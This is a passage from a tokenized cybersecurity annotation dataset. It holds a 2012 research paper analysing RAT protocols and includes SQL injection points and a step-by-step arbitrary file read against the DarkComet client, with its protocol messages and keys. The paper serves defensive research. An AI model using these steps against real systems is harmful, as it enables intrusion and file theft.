"executed", ":", "\"", "SELECT", "*", "FROM", "dc_users", "WHERE", "UUID=\"{7", "}", "\"", "If", "that", "UUID", "is", "not", "in", "the", "database", ",", "the", "following", "statement", "is", "executed", ":", "\"", "INSERT", "INTO", "dc_users", "VALUES", "(", "\"", "{", "7", "}", "\"", ",", "\"", "1", "\"", ",", "\"", "S", "\"", ",", "\"", "W", "\"", ",", "\"", "0", "\"", ")", "\""], ["If", "that", "UUID", "already", "exists", ",", "then", "the", "following", "statement", "is", "executed", ":", "\"", "UPDATE", "dc_users", "SET", "userIP=\"1", "\"", "WHERE", "UUID=\"{7", "}", "\"", "\"", "There", "is", "no", "input", "validation", "or", "sanitization", ",", "so", "all", "of", "these", "SQL", "statements", "are", "injectable", "with", "the", "following", "caveats", ":", "\u2022"], ["Executing", "multiple", "commands", "in", "one", "statement", "with", "\u201c", ";", "\u201d", "s", "is", "disabled", ",", "anything", "after", "a", "\u201c", ";", "\u201d", "will", "not", "be", "executed", "\u2022", "load_extension", "(", ")"], ["is", "disabled"], ["These", "can", "be", "used", "to", "modify", "data", "in", "the", "database", "."], ["We", "did", "not", "further", "develop", "these", "vulnerabilities", "to", "get", "information", "out", "of", "the", "database", ",", "as", "our", "next", "exploit", "made", "doing", "so", "unnecessary", "."], ["Arbitrary", "File", "Read", "from", "the", "Client", "\u2019s", "File", "System", "in", "DarkComet", "DarkComet", "uses", "a", "protocol", "that", "we", "have", "termed", "\u201c", "QuickUp", "\u201d", "in", "order", "to", "do", "ad", "-", "hoc", "uploading", "of", "files", "."], ["For", "instance", ",", "the", "client", "has", "a", "feature", "which", "allows", "you", "to", "edit", "the", "compromised", "computers", "\u201c", "hosts", "\u201d", "file", "."], ["This", "is", "done", "by", "downloading", "the", "hosts", "file", "to", "the", "client", "computer", ",", "editing", "it", ",", "and", "then", "uploading", "it", "back", "to", "the", "server", "."], ["The", "last", "part", "of", "that", "exchange", "uses", "the", "QuickUp", "protocol", ",", "and", "looks", "like", "this", ":", "DarkComet", "QuickUpload"], ["C->S", ":"], ["QUICKUPC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\SynHosts.txt|752|HOSTS", "A", "new", "connection", "between", "the", "client", "and", "server", "is", "now", "established", "to", "handle", "the", "file", "transfer", "."], ["The", "old", "connection", "is", "not", "closed", "first", ",", "the", "existing", "socket", "just", "has", "connect", "(", ")", "called", "on", "it", "again"], ["C->S", ":", "IDTYPE", "S->C", ":"], ["QUICKUP752|C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\SynHosts.txt|HOSTS", "C->S", "(", "U", "):", "\\x41\\x00\\x43", "C->S", "(", "U", "):", "LENGTH_OF_FILE_IN_BYTES", "S->C", "(", "U", "):"], ["A", "C->S"], ["(", "U", "):", "RAW_DATA_OF_SPECIFIED_FILE", "S->C", "(", "U", "):"], ["A", "\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Note", "that", "the", "protocol", "consists", "of", "two", "stages", ",", "the", "QUICKUP", "command", "issued", "from", "the", "client", ",", "which", "establishes", "a", "\u201c", "new", "\u201d", "connection", ",", "and", "the", "QUICKUP", "command", "issued", "from", "the", "server", ",", "which", "begins", "the", "file", "transfer", "."], ["Most", "importantly", ",", "after", "the", "new", "connection", "has", "been", "opened", ",", "the", "server", "requests", "the", "file", "to", "be", "uploaded", "."], ["Three", "major", "weaknesses", "are", "present", "in", "this", "implementation", ":"], ["\u2022", "There", "is", "no", "check", "that", "the", "file", "in", "the", "client", "QUICKUP", "is", "the", "same", "as", "the", "file", "in", "the", "server", "QUICKUP"], ["\u2022", "The", "client", "responds", "to", "a", "QUICKUP", "commands", ",", "even", "if", "there", "was", "no", "corresponding", "QUICKUP", "from", "the", "client"], ["\u2022", "The", "client", "allows", "the", "server", "to", "specify", "the", "absolute", "path"], ["This", "flaw", "allows", "the", "retrieval", "of", "any", "file", "on", "the", "filesystem", "that", "it", "has", "permissions", "to", "read", "."], ["So", "for", "instance", ",", "to", "get", "a", "dump", "of", "the", "SQLite", "database", ",", "we", "can", "do", "the", "following", ":", "(", "1", ")", "Connect", "to", "the", "server", "and", "successfully", "complete", "the", "handshake", "(", "2", ")", "Open", "a", "new", "connection", "over", "our", "old", "one", ",", "the", "client", "will", "now", "reply", ":", "DarkComet", "SQLite", "DB", "Dump"], ["C->S", ":", "IDTYPE"], ["We", "now", "send", "a", "QUICKUP", "command", "unprompted", "S->C", ":", "QUICKUP111|comet.db|UPLOADEXEC", "C->S", "(", "U", "):", "\\x41\\x00\\x43", "S->C", "(", "U", "):"], ["A", "C->S"], ["(", "U", "):", "LENGTH_OF_FILE", "S->C", "(", "U", "):", "A", "C->S"], ["(", "U", "):", "RAW_DATA_OF_COMET.DB", "Any", "file", "in", "the", "DarkComet", "directory", "can", "be", "read", "this", "way", "."], ["Alternatively", ",", "absolute", "paths", "can", "be", "specified", ",", "allowing", "read", "access", "to", "any", "file", "on", "the", "client", "\u2019s", "filesystem", "(", "that", "DarkComet", "has", "permissions", "to", "access", ")", "."], ["Reading", "\u201c", "C:\\secret.txt", "\u201d", "from", "Client", "\u2019s", "File", "System", "\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Reading", "\u201c", "C:\\secret.txt", "\u201d", "from", "Client", "\u2019s", "File", "SystemOverall", ",", "this", "presents", "an", "issue", "for", "anyone", "using", "DarkComet", "."], ["If", "a", "server", "sample", "is", "discovered", ",", "it", "is", "trivial", "to", "retrieve", "the", "key", "from", "the", "binary", "that", "is", "used", "in", "the", "network", "communication", "."], ["The", "key", "retrieval", "process", "can", "even", "be", "automated", "[", "4", "]", "."], ["Recently", ",", "the", "developer", "of", "the", "RAT", "has", "quit", "any", "further", "development", "due", "to", "its", "misuse", ",", "therefore", "leaving", "this", "issue", "unpatched", "[", "12", "]", "."], ["For", "a", "stub", "server", "(", "written", "in", "python", ")", "that", "can", "exploit", "both", "of", "these", "vulnerabilities", ",", "see", "Appendix", "A.", "The", "Bandook", "RAT", "Bandook", "is", "written", "in", "a", "mix", "of", "C++", "and", "Delphi", "[", "5", "]", "[", "6", "]", "."], ["The", "server", "is", "able", "to", "use", "process", "injection", ",", "API", "unhooking", ",", "and", "kernel", "patching", "to", "bypass", "(", "some", "versions", ")", "of", "the", "Windows", "firewall", "."], ["The", "server", "itself", "is", "fairly", "limited", "in", "functionality", ",", "but", "has", "the", "ability", "to", "be", "extended", "through", "a", "plugin", "architecture", ":", "the", "client", "can", "upload", "plugin", "code", "to", "the", "server", "."], ["The", "client", "comes", "with", "several", "plugins", "which", "need", "to", "be", "installed", "on", "the", "server", "to", "enable", "full", "functionality", "."], ["By", "default", ",", "the", "server", "attempts", "to", "hide", "itself", "by", "creating", "a", "process", "based", "on", "the", "default", "browser", "settings", "."], ["It", "lacks", "any", "real", "cryptography", "to", "protect", "its", "traffic", "."], ["Instead", ",", "it", "obfuscates", "its", "traffic", "by", "XORing", "against", "the", "constant", "0xE9", ":", "XOR", "Loop", "with", "Constant"], ["Almost", "all", "messages", "are", "suffixed", "with", "\u201c", "&", "&", "&", "\u201d", "in", "cleartext", ":", "Server", "Keepalive", "with", "\u201c", "&", "&", "&", "\u201d"], ["The", "client", "comes", "bundled", "with", "TightVNC", "1.2.9.0", ",", "which", "has", "a", "publicly", "known", "security", "vulnerability", "."], ["More", "information", "regarding", "the", "vulnerability", "and", "proof", "of", "concept", "code", "is", "available", "online"], ["[", "7", "]", "."], ["The", "latest", "public", "release", "of", "Bandook", "is", "v1.35", ",", "while", "the", "private", "version", "is", "at", "1.4", "."], ["The", "public", "version", "was", "released", "April", "2007", ",", "which", "makes", "it", "quite", "old", "and", "outdated", "."], ["It", "only", "supports", "up", "to", "Windows", "Vista", ",", "while", "the", "private", "version", "supports", "up", "to", "Win7", "."], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Reverse", "Engineering", "The", "Bandook", "Protocol"], ["We", "will", "leave", "out", "the", "\u201c", "&", "&", "&", "\u201d", "cleartext", "suffix", "from", "our", "analysis", "."], ["Establishing", "a", "connection", "with", "the", "client", "is", "simple", "."], ["The", "server", "will", "start", "by", "sending", "one", "command", ":", "Bandook", "Connection", "Initialization", "S", "-", ">", "C", ":", "&", "first", "&", "#", "0d", "1h", "15", "m", "#", "Admin", "#", "#", "172.16.250.128", "/", "WhiteHouse", "#", "yes#yes#no#no#bndk13me#USA#no#yes#yes", "#"], ["So", "a", "\u201c", "first", "\u201d", "command", "is", "used", "to", "establish", "a", "connection", "."], ["The", "fields", "separated", "by", "\u201c", "#", "\u201d", "correspond", "to", "info", "displayed", "in", "the", "client", ",", "such", "as", "IP", ",", "username", ",", "uptime", ",", "and", "location", "."], ["The", "fields", "marked", "yes", "/", "no", "correspond", "to", "whether", "the", "server", "has", "a", "given", "plugin", "or", "not", "."], ["The", "keepalive", "is", "as", "follows", ":", "Bandook", "Keepalive", "C", "-", ">", "S", ":", "&", "BANG", "&"], ["S-", ">", "C", ":", "&", "BAMG", "&", "To", "see", "the", "protocol", "for", "additional", "functionality", ",", "we", "recommend", "using", "the", "MITM", "decoder", "in", "Appendix", "B.", "To", "any", "researchers", "who", "are", "interested", "in", "further", "work", "on", "Bandook", ",", "we", "have", "a", "fairly", "detailed", "set", "of", "notes", "on", "the", "additional", "functionality", "protocols", ",", "which", "is", "available", "upon", "request", "."], ["The", "CyberGate", "RAT", "CyberGate", "is", "another", "RAT", "written", "in", "Delphi", "."], ["It", "\u2019s", "also", "the", "only", "RAT", "we", "saw", "that", "featured", "protection", "against", "reverse", "engineering", "."], ["Using", "LordPE", "to", "obtain", "a", "dump", ",", "you", "can", "see", "the", "following", "strings", ":", "CyberGate", "Anti", "-", "Analysis", "\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Both", "PEiD", "and", "Detect", "It", "Easy", "could", "not", "identify", "what", "packer", "had", "been", "used", "."], ["We", "worked", "on", "unpacking", "it", ",", "until", "we", "finally", "discovered", "a", "tool", "called", "ProtectionID", "."], ["This", "was", "able", "to", "identify", "the", "packer", "as", "Safengine", "Licensor", "."], ["From", "some", "basic", "research", ",", "we", "discovered", "that", "unpacking", "the", "Safengine", "Licensor", "is", "a", "project", "in", "itself", "."], ["Due", "to", "our", "time", "constraint", ",", "we", "found", "it", "would", "be", "best", "to", "continue", "our", "efforts", "analyzing", "another", "RAT", "."], ["Before", "moving", "on", "though", ",", "we", "were", "able", "to", "uncover", "enough", "information", "about", "its", "protocol", "from", "the", "server", "stubs", "we", "created", "(", "which", "are", "n\u2019t", "packed", ")", "."], ["Interestingly", ",", "CyberGate", "uses", "two", "different", "schemes", "for", "communication", "."], ["Communication", "from", "the", "client", "to", "the", "server", "is", "done", "using", "a", "variant", "of", "base64", "."], ["The", "messages", "are", "base64", "encoded", ",", "except", "instead", "of", "the", "canonical", "base64", "string", ":", "\u201c", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567", "89+/", "\u201d", "the", "string", "used", "is", "\"", "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx", "yz+/", "\""], ["This", "is", "an", "obfuscation", "technique", "that", "is", "also", "common", "in", "enterprise", "software", ";", "because", "the", "base64", "dictionary", "has", "been", "scrambled", ",", "a", "standard", "base64", "decoder", "produces", "gibberish", "when", "fed", "the", "data", "."], ["The", "base64", "encoded", "messages", "end", "with", "the", "string", "\u201c", "#", "#", "#", "@@@", "\u201d", ",", "which", "when", "replaced", "with", "\u201c", "=", "=", "\u201d", "and", "then", "fed", "into", "a", "base64", "decoder", "(", "working", "against", "the", "custom", "string", ")", ",", "produce", "cleartext", "."], ["In", "the", "other", "direction", ",", "messages", "going", "from", "the", "server", "to", "the", "client", "are", "first", "compressed", "using", "zlib", "(", "at", "a", "compression", "level", "of", "1", ")", ",", "and", "then", "encrypted", "with", "RC4", "against", "the", "following", "key", ":"], ["njgnjvejvorenwtrnionrionvironvrnvcg210public", "They", "are", "then", "prefixed", "with", "the", "string", "\u201c", "@@XXXXXXXXXX@@", "\u201d"], ["Based", "off", "of", "this", "information", ",", "we", "think", "it", "\u2019s", "safe", "to", "assume", "the", "private", "version", "will", "have", "some", "subtle", "differences", "in", "its", "communication", "."], ["Most", "likely", "the", "key", "is", "different", ",", "but", "the", "overall", "communication", "architecture", "is", "the", "same", "."], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["CyberGate", "RC4", "Swap", "\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["CyberGate", "Handshake", "S->C", "(", "U", "):", "34|\\n", "S->C", ":"], ["cybergate|Y|", "C->S", "(", "U", "):", "\\x20\\r\\n", "S->C", "(", "U", "):", "\\n", "C->S", ":", "maininfo|cybergate|497125y5QX8qVHZ6KNoEzseP1UYFjR|", "S->C", "(", "U", "):", "\\n", "S->C", ":", "(", "stripping", "out", "a", "lot", "of", "null", "bytes", ")", "maininfo|"], ["CGServer_EC3E266B172.16.1.128JESSE-3AA4AD4D2/", "Administrator-=WindowsXPProfessionalx32(Build:2600ServicePack", ":", "3.0)*Intel(R)Core(TM)2DuoCPUP8600@2.40GHz511MBConsole", "v2.3.0", "-", "Public4000CyberGateServerConsole2301UnitedStates/", "English\"English(UnitedStates)\"05/07/2012", "-", "-15:24172.16.1.1:4000", "|#CGServer|cybergate|console1|Yes|", "C->S", ":", "configuracoesdoserver|", "S->C"], ["(", "U", "):", "\\n", "S->C", "(", "U", "):", "89|\\n", "S->C", ":", "configuracoesdoserver|configuracoesdoserver|172.16.1.1:4000|", "#", "CGServer|cybergate|console1|Yes|"], ["Its", "keepalive", "looks", "like", "this", ":", "CyberGate", "Keepalive", "C", "-", ">", "S"], ["(", "U", "):", "ping|S-", ">", "C", ":", "S->C", "(", "U", "):", "pong|CyberGateServerConsole###10157|", "A", "MITM", "script", "that", "can", "decrypt", "traffic", "is", "in", "Appendix", "C.", "Xtreme", "RAT"], ["Xtreme", "RAT", "was", "another", "one", "of", "the", "RATs", "used", "by", "the", "Syrian", "government", "."], ["We", "have", "n\u2019t", "seen", "much", "public", "analysis", "of", "Xtreme", "RAT", "."], ["The", "guys", "over", "at", "malware.lu", "published", "a", "simple", "article", "covering", "a", "sample", "they", "received", "in", "an", "email", "."], ["Their", "\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["analysis", "covered", "identifying", "and", "decrypting", "config", "information", "from", "the", "stub"], ["[", "10", "]", "."], ["Our", "analysis", "will", "look", "into", "the", "communication", "protocol", "of", "the", "RAT", "."], ["Before", "looking", "at", "any", "internals", ",", "we", "opted", "to", "get", "a", "feel", "for", "the", "UI", "."], ["On", "the", "first", "run", ",", "users", "are", "prompted", "to", "enter", "a", "password", "."], ["Once", "entered", ",", "the", "program", "asks", "users", "to", "retype", "the", "password", "to", "confirm", "it", "."], ["After", "doing", "so", ",", "a", "file", "named", "\u201c", "user.info", "\u201d", "is", "created", "in", "the", "same", "directory", "."], ["This", "file", "is", "simply", "a", "unicode", "string", "of", "the", "MD5", "hash", "of", "your", "password", "."], ["Unicode", "MD5", "Hash", "of", "Password", "in"], ["So", "if", "your", "password", "is", "\u201c", "123", "\u201d", ",", "your", "user.info", "will", "contain", "the", "hash", "\u2018", "a933d13f81649bebe035dc21f4002ff1", "\u2019", "."], ["However", ",", "when", "we", "tried", "hashing", "\u201c", "123", "\u201d", "we", "found", "a", "different", "result", "(", "the", "correct", "hash", "is", "\u2018", "202cb962ac59075b964b07152d234b70", "\u2019", ".", ")"], ["It", "turns", "out", "this", "is", "an", "issue", "that", "was", "introduced", "in", "Delphi", "2009", ",", "when", "the", "default", "string", "type", "switched", "from", "ANSI", "strings", "to", "unicode", "strings", "."], ["The", "MD5", "implementation", "is", "not", "unicode", "aware", "[", "11", "]", ",", "leading", "to", "incorrect", "hashes", "."], ["When", "creating", "a", "server", ",", "we", "tried", "to", "change", "the", "password", "from", "its", "default", "\u2018", "0123456789", "\u2019", "."], ["It", "turns", "out", "Xtreme", "RAT", "limits", "your", "password", "to", "being", "only", "digits", "."], ["It", "also", "rejects", "any", "password", "that", "can", "not", "fit", "in", "a", "32", "-", "bit", "signed", "integer", "."], ["Well", ",", "that", "\u2019s", "not", "making", "us", "feel", "very", "secure", "."], ["The", "public", "version", "also", "limits", "the", "user", "to", "creating", "a", "stub", "which", "can", "only", "connect", "to", "localhost", "on", "port", "81", "."], ["It", "also", "includes", "an", "annoying", "nag", "screen", "notifying", "the", "user", "that", "it", "is", "the", "public", "version", "."], ["However", ",", "all", "the", "functionality", "of", "the", "private", "version", "is", "present", "."], ["In", "order", "to", "begin", "analyzing", "its", "communication", ",", "we", "had", "to", "change", "the", "communication", "IP", "."], ["First", ",", "a", "quick", "analysis", "of", "the", "server", "stub", "."], ["The", "Xtreme", "RAT", "Server"], ["The", "stub", "sets", "itself", "up", "using", "a", "classic", "technique", "found", "in", "basic", "malware", "."], ["It", "first", "uses", "CreateProcess", "(", ")", "to", "create", "a", "new", "process", "(", "named", "based", "on", "the", "default", "browser", ".", ")"], ["CreateProcess", "(", ")"], ["Based", "on", "Default"], ["Next", ",", "it", "uses", "WriteProcessMemory", "(", ")", "to", "copy", "code", "to", "the", "newly", "created", "process"], ["(", "PE", "header", "starts", "at", "0x1610000", ")", "."], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Copying", "Code", "to", "the", "Newly", "Created"], ["It", "finishes", "the", "setup", "by", "simply", "resuming", "the", "thread", "using", "ResumeThread", "(", ")", "."], ["After", "patching", "the", "process", "to", "have", "an", "opcode", "of", "0xEBFE", ",", "which", "is", "an", "infinite", "loop", ",", "at", "the", "point", "where", "the", "thread", "resumes", ",", "we", "attached", "a", "debugger", "and", "noticed", "that", "the", "process", "begins", "packed", "with", "UPX", "."], ["Standard", "Entry", "Point"], ["Unpacking", "is", "trivial", "from", "this", "point", "."], ["Locate", "the", "JMP", "following", "the", "POPAD", "instruction", "."], ["Standard", "JMP", "to", "OEP"], ["This", "brings", "us", "to", "our", "OEP", ":", "Original", "Entry", "Point", "for"], ["After", "patching", "the", "dump", "to", "connect", "to", "a", "different", "address", ",", "and", "removing", "the", "nag", "screen", ",", "we", "were", "able", "to", "start", "our", "analysis", "of", "the", "communication", "."], ["Xtreme", "RAT", "Communication", "\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Xtreme", "RAT", "Handshake", "Overview", "S->C", "(", "U", "):", "myversion|3.6"], ["Public\\r\\n", "C->S", "(", "U", "):", "\\x58\\x0d\\x0a", "C->S", "(", "U", "):", "\\xd2\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00", "C->S", ":", "maininfo", "?", "?", "?", "?", "?", "?"], ["#", "#", "#", "?", "\"", "a", "?", "\"", "a", "?", "\"", "apK8qxVwtQ7XBgCuT0bFldfRjaSLmhHPGJyirE5z2A431ZMYUe69WnDcsoNk90dd3e7e19b35baa", "54015d0b4a08f2d0", "The", "communication", "of", "Xtreme", "RAT", "begins", "with", "the", "server", "making", "a", "connection", "to", "the", "client", "."], ["We", "then", "have", "the", "following", ":", "Xtreme", "RAT", "Identify", "Message"], ["S"], ["->C", "(", "U", "):", "myversion|3.6"], ["Public\\r\\n"], ["The", "client", "acknowledges", "by", "sending", ":", "Xtreme", "RAT", "ACK", "C"], ["->S", "(", "U", "):", "\\x58\\x0d\\x0a", "Communication", "continues", "with", "the", "client", "asking", "for", "info", "about", "the", "server", "."], ["Notice", "that", "before", "any", "message", "sent", ",", "the", "stub", "or", "client", "will", "first", "send", "the", "password", "and", "length", "of", "the", "message", "to", "come", ",", "in", "little", "endian", "format", "."], ["Annoyingly", ",", "sometimes", "it", "sends", "this", "header", "as", "its", "own", "packet", ",", "sometimes", "it", "comes", "prefixed", "to", "the", "actual", "content", "."], ["And", "sometimes", "it", "prefixes", "the", "header", "with", "an", "ACK", "of", "\u201c", "\\x58\\x0d\\x0a", "\u201d", "."], ["In", "this", "example", ",", "the", "password", "is", "1234", "and", "the", "length", "of", "the", "message", "to", "follow", "is", "166", "bytes", "."], ["Xtreme", "RAT", "Password", "/", "Length", "Message", "C", "-", ">", "S", ":"], ["\\xd2\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00", "|-", ">", "Password", "=", "0x4d2", "=", "1234"], ["|->Four", "bytes", "padding", "|-", ">", "Length", "=", "0xa6", "=", "166"], ["|->Four", "bytes", "padding", "Now", "what", "follows", "is", "some", "zlib", "compressed", "data", "with", "size", "166", "bytes", "."], ["Note", "that", "sometimes", "our", "MITM", "script", "fails", "to", "decode", "the", "zlib", "compressed", "data", ",", "for", "reasons", "unknown", "to", "us", "."], ["After", "decompression", "we", "have", "the", "following", ":", "\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Xtreme", "RAT", "Maininfo", "maininfo", "?", "?", "?", "?", "?", "?"], ["#", "#", "#", "?", "\"", "a", "?", "\"", "a", "?", "\"", "apK8qxVwtQ7XBgCuT0bFldfRjaSLmhHPGJyirE5z2A431ZMYUe69WnDcsoNk90dd3e7e19b35baa", "54015d0b4a08f2d0", "Breaking", "it", "into", "its", "parts", "we", "have", ":", "Xtreme", "RAT", "Maininfo", "Dissected", "CMD", ":", "maininfo", "SEPARATOR", ":"], ["\\xc2\\x00\\xaa\\x00\\xc2\\x00\\xaa\\x00\\xc2\\x00\\xaa"], ["\\x00\\x23\\x00\\x23\\x00\\x23\\x00\\xe2\\x00\\x22\\x20\\x61\\x01\\xe2\\x00\\x22\\x20\\x61\\x01\\xe2\\x00\\x22\\x20", "\\x61\\x01", "RANDOM", "STRING", ":", "pK8qxVwtQ7XBgCuT0bFldfRjaSLmhHPGJyirE5z2A431ZMYUe69WnDcsoNk", "MD5", ":"], ["90dd3e7e19b35baa54015d0b4a08f2d0"], ["The", "random", "string", "is", "just", "that", ",", "a", "random", "string", "of", "length", "0x3B", "or", "59", "."], ["It", "\u2019s", "generated", "using", "the", "character", "set", ":", "[", "0", "-", "9],[A", "-", "Z],[a", "-", "z", "]", "."], ["The", "hash", "is", "the", "incorrect", "MD5sum", "of", "\u201c", "XtremeRAT", "\u201d", "."], ["This", "will", "always", "remain", "the", "same", "(", "at", "least", "for", "the", "public", "version", "3.6", ")", "."], ["What", "follows", "is", "a", "response", "which", "contains", "some", "information", "about", "the", "system", "."], ["It", "follows", "the", "same", "protocol", "as", "before", ",", "with", "the", "password", "and", "length", "header", ",", "and", "the", "remaining", "message", "being", "compressed", "with", "zlib", "."], ["After", "this", "response", ",", "the", "stub", "is", "now", "connected", "to", "the", "client", ",", "but", "will", "continue", "to", "send", "more", "info", ",", "such", "as", "a", "screenshot", "of", "the", "desktop", "and", "a", "list", "of", "any", "webcams", "installed", "."], ["At", "this", "point", ",", "a", "full", "connection", "is", "established", "."], ["The", "client", "will", "send", "a", "keep", "alive", "while", "idle", ",", "which", "looks", "like", "the", "following", ":", "Xtreme", "RAT", "Keepalive", "C", "-", ">", "S", ":", "ping", "S", "-", ">", "C", ":", "pong|937|Current_Window", "(", "Server_Name", ")", "Also", "worth", "noting", ",", "Xtreme", "has", "the", "ability", "to", "try", "to", "disguise", "its", "handshake", "as", "HTTP", "."], ["In", "which", "case", ",", "its", "opening", "request", "will", "look", "like", "(", "with", "the", "default", "password", "):", "Xtreme", "RAT", "GET", "Request", "S->C", "(", "U", "):"], ["GET/1234567890.functions", "HTTP/1.1", "Accept:*/*Accept", "-", "Encoding", ":", "gzip", ",", "deflate"], ["User", "-", "Agent", ":", "Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Trident/", "4.0;.NETCLR1.1.4322;.NETCLR2.0.50727;.NETCLR3.0.4506.2152;.NETCLR3.5.30729", ";", "."], ["NET4.0C", ")"], ["Host:172.16.1.1:4000", "Connection", ":", "Keep", "-", "Alive", "\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Conclusion", "RATs", "represent", "an", "under", "-", "researched", "but", "highly", "active", "area", "of", "malware", "\u201c", "in", "the", "wild", "\u201d", "."], ["With", "both", "governments", "and", "non", "-", "state", "actors", "using", "RATs", "for", "surveillance", ",", "knowledge", "about", "them", "carries", "increasing", "significance", "."], ["A", "good", "understanding", "of", "their", "protocols", "is", "critical", "to", "network", "and", "system", "administrators", "deploying", "tools", "that", "can", "notice", "the", "presence", "of", "a", "RAT", "."], ["All", "of", "the", "RATs", "we", "analyzed", "were", "written", "in", "Delphi", "."], ["This", "gave", "the", "RATs", "some", "resilience", "against", "classical", "security", "mistakes", "(", "buffer", "/", "heap", "overflows", ")", "that", "are", "much", "easier", "to", "make", "in", "a", "language", "like", "C", "or", "C++", "."], ["However", ",", "we", "still", "found", "serious", "vulnerabilities", "in", "DarkComet", ",", "which", "was", "the", "most", "widely", "deployed", "of", "the", "RATs", "we", "studied", "."], ["Our", "analysis", "of", "the", "communications", "should", "provide", "a", "solid", "foundation", "for", "other", "researchers", "interested", "in", "further", "reverse", "engineering", "and", "vulnerability", "research", "on", "RATs", "."], ["Some", "notable", "coincidences", "in", "behaviors", "between", "RATs", "(", "use", "of", "Delphi", ",", "using", "the", "\u201c", "|", "\u201d", "character", "as", "a", "separator", ",", "similar", "UIs", ",", "use", "of", "zlib", ",", "use", "of", "RC4", ",", "and", "other", "protocol", "similarities", ")", "may", "suggest", "shared", "code", ",", "although", "we", "do", "not", "have", "enough", "evidence", "to", "make", "any", "definitive", "statements", "on", "that", "subject", "."], ["Special", "thanks", "to", "John", "Villamil", "(", "@day6reak", ")", "for", "his", "guidance", "and", "knowledge", "on", "this", "project", ",", "and", "to", "the", "rest", "of", "the", "Matasano", "Security", "team", "!"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."]]}, {"vertexSet": [[{"name": "Zero-day", "pos": [0, 3], "sent_id": 1, "type": "Exploit"}], [{"name": "VeriSign iDefense", "pos": [20, 22], "sent_id": 4, "type": "Organization"}], [{"name": "Wicked Rose", "pos": [0, 2], "sent_id": 5, "type": "Attacker"}], [{"name": "NCPH", "pos": [9, 10], "sent_id": 5, "type": "AttackerGroup"}], [{"name": "2006", "pos": [25, 26], "sent_id": 5, "type": "Time"}], [{"name": "KuNgBiM", "pos": [8, 9], "sent_id": 9, "type": "Attacker"}], [{"name": "Rodag", "pos": [9, 10], "sent_id": 9, "type": "Attacker"}], [{"name": "Charles", "pos": [10, 11], "sent_id": 9, "type": "Attacker"}], [{"name": "Microsoft Word Malformed OLE Structure Code Execution", "pos": [14, 21], "sent_id": 14, "type": "Vulnerability"}], [{"name": "Microsoft Excel Malformed BIFF Structure Code Execution", "pos": [22, 29], "sent_id": 14, "type": "Vulnerability"}], [{"name": "Internet Storm Center", "pos": [4, 7], "sent_id": 16, "type": "Organization"}], [{"name": "iDefense", "pos": [0, 1], "sent_id": 17, "type": "Organization"}], [{"name": "SANS", "pos": [4, 5], "sent_id": 17, "type": "Organization"}], [{"name": "GinWui", "pos": [18, 19], "sent_id": 18, "type": "MalwareFamily"}], [{"name": "Microsoft Word 2002", "pos": [27, 30], "sent_id": 19, "type": "Software"}], [{"name": "May 12, 2006", "pos": [3, 7], "sent_id": 20, "type": "Time"}], [{"name": "United States", "pos": [11, 13], "sent_id": 21, "type": "Country"}], [{"name": "Japan", "pos": [16, 17], "sent_id": 21, "type": "Country"}], [{"name": "GinWui.A", "pos": [4, 7], "sent_id": 22, "type": "Malware"}], [{"name": "GinWui.B", "pos": [8, 11], "sent_id": 22, "type": "Malware"}], [{"name": "Wicked Rose", "pos": [12, 14], "sent_id": 23, "type": "Attacker"}], [{"name": "nease.net", "pos": [8, 9], "sent_id": 26, "type": "Indicator"}], [{"name": "Planning document 5-16-2006.doc", "pos": [9, 12], "sent_id": 34, "type": "File"}], [{"name": "May 17, 2006", "pos": [5, 9], "sent_id": 36, "type": "Time"}], [{"name": "GinWui", "pos": [2, 3], "sent_id": 39, "type": "Payload"}], [{"name": "GinWui", "pos": [17, 18], "sent_id": 39, "type": "TrojanHorse"}], [{"name": "winguis.dll", "pos": [4, 5], "sent_id": 40, "type": "TrojanHorse"}], [{"name": "Wicked Rose", "pos": [0, 2], "sent_id": 43, "type": "Attacker"}], [{"name": "GinWui", "pos": [7, 8], "sent_id": 43, "type": "Malware"}], [{"name": "WHG", "pos": [4, 5], "sent_id": 45, "type": "Organization"}], [{"name": "Wicked Rose", "pos": [3, 5], "sent_id": 51, "type": "Attacker"}], [{"name": "June 21, 2006", "pos": [29, 33], "sent_id": 52, "type": "Time"}], [{"name": "RipGof", "pos": [20, 21], "sent_id": 55, "type": "Attacker"}], [{"name": "June 2006", "pos": [7, 9], "sent_id": 56, "type": "Time"}], [{"name": "RipGof.B", "pos": [26, 29], "sent_id": 56, "type": "TrojanHorse"}], [{"name": "MS06-027", "pos": [5, 8], "sent_id": 57, "type": "Vulnerability"}], [{"name": "RipGof.B", "pos": [10, 13], "sent_id": 57, "type": "TrojanHorse"}], [{"name": "RipGof.B", "pos": [3, 6], "sent_id": 64, "type": "TrojanHorse"}], [{"name": "enjoy.irdet.com", "pos": [10, 11], "sent_id": 64, "type": "Indicator"}], [{"name": "enjoy.bmwsee.com", "pos": [12, 13], "sent_id": 64, "type": "Indicator"}], [{"name": "RipGof.A", "pos": [20, 23], "sent_id": 66, "type": "TrojanHorse"}], [{"name": "RipGof.A", 